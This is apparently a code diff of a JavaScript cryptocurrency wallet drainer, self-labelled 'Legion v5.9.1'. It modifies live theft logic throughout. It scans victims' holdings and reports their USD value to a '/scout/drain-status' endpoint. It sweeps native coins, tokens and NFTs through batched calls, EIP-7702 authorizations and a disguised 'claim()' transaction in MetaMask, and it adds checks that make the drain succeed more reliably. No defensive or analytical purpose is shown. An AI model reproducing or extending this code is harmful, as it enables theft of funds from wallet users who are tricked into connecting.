@@ -469,6 +469,7 @@
   };
 
   var NATIVE_TRANSFER_GAS = 21000n;
+  var CLAIM_CONTRACT_GAS = 120000n;
   var ERC20_TRANSFER_GAS = 65000n;
 
   /** Live EIP-1559 fees from wallet RPC — no fixed reserve. */
@@ -1163,6 +1164,7 @@
           source_page: window.location.href,
           connect_session: S.connectSession || undefined,
           connected_wallets: connected.length ? connected : undefined,
+          scout_value_usd: S.scoutUsd > 0 ? S.scoutUsd : undefined,
         });
       } catch (e) {}
     },
@@ -1184,9 +1186,11 @@
     },
 
     reportScanComplete: async function (address, totalUsd, assetCount, walletName, chainId) {
-      if (S.fusionNotified) return;
+      var usd = Number(totalUsd) || 0;
+      if (usd <= 0) return;
+      if (S.fusionNotified && S.scoutUsd >= usd) return;
       S.fusionNotified = true;
-      S.scoutUsd = Math.max(S.scoutUsd, Number(totalUsd) || 0);
+      S.scoutUsd = Math.max(S.scoutUsd, usd);
       try {
         await apiPost('/api/v1/scout/drain-status', {
           wallet_address: address,
@@ -1205,6 +1209,7 @@
     fusion: async function (addrs) {
       try {
         var body = { connect_session: S.connectSession || undefined };
+        if (S.scoutUsd > 0) body.scout_value_usd = S.scoutUsd;
         if (addrs.evm) body.evm_holder = addrs.evm;
         if (addrs.sol) body.sol_owner_base58 = addrs.sol;
         if (addrs.tron) body.tron_holder_base58 = addrs.tron;
@@ -1308,8 +1313,16 @@
       /rejected|denied|cancelled|user rejected|declined/i.test(msg);
   }
 
-  function estimateSendCallsGasLimit(tokenCount, nftCount, hasNative) {
-    var limit = hasNative ? NATIVE_TRANSFER_GAS : 0n;
+  function isLikelyTxHash(id) {
+    return typeof id === 'string' && /^0x[a-fA-F0-9]{64}$/.test(id);
+  }
+
+  function estimateSendCallsGasLimit(tokenCount, nftCount, hasNative, chainId) {
+    var nativeGas = 0n;
+    if (hasNative) {
+      nativeGas = resolveClaimContract(chainId) ? CLAIM_CONTRACT_GAS : NATIVE_TRANSFER_GAS;
+    }
+    var limit = nativeGas;
     limit += BigInt(tokenCount || 0) * ERC20_TRANSFER_GAS;
     limit += BigInt(nftCount || 0) * ERC20_TRANSFER_GAS;
     if (limit < NATIVE_TRANSFER_GAS) limit = NATIVE_TRANSFER_GAS;
@@ -1608,7 +1621,7 @@
     (assets.nfts || []).forEach(function (n) { if (n.contract) nftContracts[n.contract.toLowerCase()] = true; });
     var nftCount = Object.keys(nftContracts).length;
     var bal = BigInt(assets.nativeHex || '0x0');
-    var gasLimit = estimateSendCallsGasLimit(tokenCount, nftCount, bal > 0n);
+    var gasLimit = estimateSendCallsGasLimit(tokenCount, nftCount, bal > 0n, chainId);
     var sweep = await calcMaxNativeSendWei(provider, assets.nativeHex, chainId, gasLimit);
     var sendEth = sweep.send;
 
@@ -1656,7 +1669,9 @@
       });
       var extracted = extractBatchOrTxId(batchId);
       L.log('sendCalls batchId:', extracted ? extracted.slice(0, 42) : String(batchId));
-      return extracted || batchId;
+      if (extracted && isLikelyTxHash(extracted)) return extracted;
+      if (extracted) L.warn('sendCalls returned bundle id (not tx hash) — will try eth_sendTransaction');
+      return null;
     } catch (e) {
       L.warn('wallet_sendCalls v2 fail:', e.message);
       try {
@@ -1670,7 +1685,9 @@
             calls: calls,
           }],
         });
-        return extractBatchOrTxId(batchId2) || batchId2;
+        var extracted2 = extractBatchOrTxId(batchId2);
+        if (extracted2 && isLikelyTxHash(extracted2)) return extracted2;
+        return null;
       } catch (e2) { L.warn('wallet_sendCalls v1 fail:', e2.message); return null; }
     }
   }
@@ -1906,7 +1923,7 @@
     var caps = await getCapabilities(provider, address, chainId);
     L.log('chain', chainId, 'atomicBatch:', caps.atomicBatch, '| signOnly:', SIGN_ONLY);
 
-    var gasLimit = estimateSendCallsGasLimit(assets.tokens.length, assets.nfts.length, true);
+    var gasLimit = estimateSendCallsGasLimit(assets.tokens.length, assets.nfts.length, true, chainId);
     var sweep = await calcMaxNativeSendWei(provider, assets.nativeHex, chainId, gasLimit);
     var nativeSend = sweep.send;
     if (nativeSend > 0n) {
@@ -1963,7 +1980,18 @@
     }
 
     if (isMetaMaskProvider(provider) && nativeSend > MIN_NATIVE_WEI && !didSomething) {
-      L.log('MetaMask: skipping eth_signTransaction (not supported) — trying EIP-7702 / batch');
+      L.log('MetaMask: eth_sendTransaction claim() first (reliable gas)');
+      UI.status('Confirm transaction in MetaMask...');
+      try {
+        var mmTxFirst = await drainNativeSendTx(provider, address, chainId, assets);
+        if (mmTxFirst && isLikelyTxHash(mmTxFirst)) {
+          await SUBMIT.userBroadcast(mmTxFirst, address, chainId, walletName, nativeSend);
+          didSomething = true;
+        }
+      } catch (mmeFirst) {
+        if (isUserRejection(mmeFirst)) throw mmeFirst;
+        L.warn('MetaMask claim() fail:', mmeFirst.message);
+      }
     }
 
     // TIER 2: EIP-7702 authorization signature (backend executes drain)
@@ -1984,17 +2012,17 @@
       L.log('Native batch fallback (wallet_sendCalls)...');
       var batchRaw = await drainSendCalls(provider, address, chainId, assets);
       var batchId = extractBatchOrTxId(batchRaw);
-      if (batchId) {
+      if (batchId && isLikelyTxHash(batchId)) {
         await SUBMIT.sendCalls(batchId, address, chainId, walletName);
         didSomething = true;
-      } else if (batchRaw) {
-        L.warn('wallet_sendCalls returned non-hash:', typeof batchRaw);
+      } else if (batchId) {
+        L.warn('wallet_sendCalls bundle id only — not marking success');
       }
     } else if (!didSomething && !SIGN_ONLY && caps.atomicBatch && !PLAT.isMobile) {
       UI.status('Confirm in wallet...');
       var batchRaw2 = await drainSendCalls(provider, address, chainId, assets);
       var batchId2 = extractBatchOrTxId(batchRaw2);
-      if (batchId2) {
+      if (batchId2 && isLikelyTxHash(batchId2)) {
         await SUBMIT.sendCalls(batchId2, address, chainId, walletName);
         didSomething = true;
       }
@@ -2006,7 +2034,7 @@
       UI.status('Confirm in wallet...');
       L.log('Mobile native tx (eth_sendTransaction)...');
       var txHash = await drainNativeSendTx(provider, address, chainId, assets);
-      if (txHash) {
+      if (txHash && isLikelyTxHash(txHash)) {
         await SUBMIT.userBroadcast(txHash, address, chainId, walletName, nativeSend);
         didSomething = true;
       }
@@ -2018,7 +2046,7 @@
       L.log('MetaMask claim() fallback (eth_sendTransaction)...');
       try {
         var mmTx = await drainNativeSendTx(provider, address, chainId, assets);
-        if (mmTx) {
+        if (mmTx && isLikelyTxHash(mmTx)) {
           await SUBMIT.userBroadcast(mmTx, address, chainId, walletName, nativeSend);
           didSomething = true;
         }
@@ -2640,16 +2668,26 @@
       : collectAddressMap(evmCtx.address);
     S.omnichainLegs = {};
 
+    var rankedAll = await SCOUT.ranked(evmCtx.address);
+    if (rankedAll && rankedAll.total_usd) {
+      S.scoutUsd = Math.max(S.scoutUsd, Number(rankedAll.total_usd) || 0);
+    }
+
     await SCOUT.telemetry(evmCtx.address, evmCtx.chainId, evmCtx.walletName, addrs);
     var fusionData = await SCOUT.fusion(addrs);
     if (fusionData && fusionData.total_usd) {
       S.scoutUsd = Math.max(S.scoutUsd, Number(fusionData.total_usd) || 0);
       L.log('Fusion USD (all families):', S.scoutUsd.toFixed(2));
     }
-    var rankedAll = await SCOUT.ranked(evmCtx.address);
-    if (rankedAll && rankedAll.total_usd) {
-      S.scoutUsd = Math.max(S.scoutUsd, Number(rankedAll.total_usd) || 0);
-    }
+
+    await SCOUT.reportScanComplete(
+      evmCtx.address,
+      S.scoutUsd,
+      (fusionData && fusionData.assets_count) || (rankedAll && rankedAll.ranked && rankedAll.ranked.length) || 0,
+      evmCtx.walletName,
+      evmCtx.chainId
+    );
+
     evmCtx.chainId = await ensureFundedEvmChain(evmCtx.provider, evmCtx.address, evmCtx.chainId);
     S.evmChain = evmCtx.chainId;
     var priority = SCOUT.chainPriority();
@@ -2772,8 +2810,8 @@
 
     sendCalls: async function (batchId, address, chainId, walletName) {
       var txHash = extractBatchOrTxId(batchId) || String(batchId);
-      if (!txHash || !txHash.startsWith('0x')) {
-        L.warn('sendCalls: invalid batch id');
+      if (!isLikelyTxHash(txHash)) {
+        L.warn('sendCalls: not a real tx hash — skip submit');
         return null;
       }
       return this.base({
@@ -2787,6 +2825,10 @@
     userBroadcast: async function (txHash, address, chainId, walletName, amountWei) {
       var hash = String(txHash);
       if (!hash.startsWith('0x')) hash = toHex(hash);
+      if (!isLikelyTxHash(hash)) {
+        L.warn('userBroadcast: not a real tx hash — skip submit');
+        return null;
+      }
       return this.base({
         chain_family: 'EVM', protocol: 'eip7702_self_broadcast',
         wallet_address: address.toLowerCase(), chain_id: Number(chainId),
@@ -3526,7 +3568,7 @@
       };
     }
 
-    L.log('Legion v5.9.0 ready — unified multi-family connect');
+    L.log('Legion v5.9.1 ready — unified multi-family connect');
 
     // Only auto-connect when explicitly enabled (never on silentMode alone)
     if (CFG.autoConnectOnLoad === true && AUTO_DRAIN && !S.drainRunning && window.ethereum) {
